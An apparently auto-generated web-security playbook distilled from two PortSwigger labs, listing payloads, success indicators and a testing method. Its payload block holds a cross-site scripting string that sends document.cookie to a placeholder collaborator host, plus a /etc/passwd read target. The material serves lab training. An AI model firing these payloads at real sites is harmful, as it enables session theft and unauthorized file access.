## ESSENTIAL-SKILLS Playbook
*Synthesized from 2 PortSwigger labs*

### Overview
This playbook covers 2 known attack techniques for essential-skills.

### Attack Techniques

**General:**
- Discovering vulnerabilities quickly with targeted scanning
- Scanning non-standard data structures

### Key Payloads
```
[TEST_USER]:[TEST_PASS]
GET /my-account?id=[TEST_USER]
/etc/passwd
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

